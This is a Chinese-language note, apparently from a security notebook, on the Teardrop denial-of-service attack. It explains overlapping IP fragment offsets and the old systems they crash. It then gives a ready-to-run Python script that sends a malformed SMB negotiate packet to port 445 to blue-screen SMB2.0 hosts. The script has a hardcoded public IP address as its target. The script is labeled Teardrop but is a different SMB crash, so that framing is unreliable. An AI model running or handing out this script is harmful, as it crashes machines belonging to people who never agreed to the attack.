
# TearDrop 攻击

* 简介
* 攻击脚本
## 简介

> 主要针对早期微软操作系统（95、98、3.x、nt）  
  近些年有人发现对 2.x 版本的安卓系统、6.0 IOS 系统攻击有效

* 原理
> 使用 IP 分段便宜实现分段覆盖，接收端处理分段覆盖时可被拒绝服务
* 攻击效果
> 被攻击者蓝屏、重启、卡死

* Ping大包，比较正常分段与teardrop攻击流量的区别  
* 针对早期windows系统SMB协议的攻击
> teardrop_smb.py

* 针对Android.IOS 系统的攻击
> teardrop_androidios.py

* 攻击向量并不确定，要视具体协议分析
  

* 攻击目标
> 泪滴攻击是一种拒绝服务（DoS）攻击，涉及将碎片数据包发送到目标机器。由于接收这些数据包的机器由于TCP / IP碎片重组错误而无法重新组装，因此数据包相互重叠，导致目标网络设备崩溃。这通常发生在较早的操作系统上，例如Windows 3.1x，Windows 95，Windows NT和2.1.63之前版本的Linux内核。
  
> IP报头中的一个字段是“片段偏移量”字段，指示包含在分段数据包中的数据相对于原始数据包中的数据的起始位置或偏移量。如果一个分片数据包的偏移量和大小之和不同于下一个分片数据包的偏移量和大小之和，则数据包重叠。发生这种情况时，易受泪滴攻击的服务器无法重新组装数据包 - 从而导致拒绝服务状况。


## 攻击脚本
``` 
#!/usr/bin/python
# When SMB2.0 recieve a "&" char in the "Process Id High"
# SMB header field it dies with a
# PAGE_FAULT_IN_NONPAGED_AREA
# filename: teardrop-attack-smb.py

import sys
from socket import socket
from time import sleep

#host = sys.argv[1], 445
#host = "192.168.33.13", 445
host = "217.113.205.53", 445
buff = (
"\x00\x00\x00\x90" # Begin SMB header: Session message
"\xff\x53\x4d\x42" # Server Component: SMB
"\x72\x00\x00\x00" # Negociate Protocol
"\x00\x18\x53\xc8" # Operation 0x18 & sub 0xc853
"\x00\x26"# Process ID High: --> :) normal value should be "\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
"\x30\x30\x32\x00"
)
s = socket()
s.connect(host)
s.send(buff)
s.close()

```


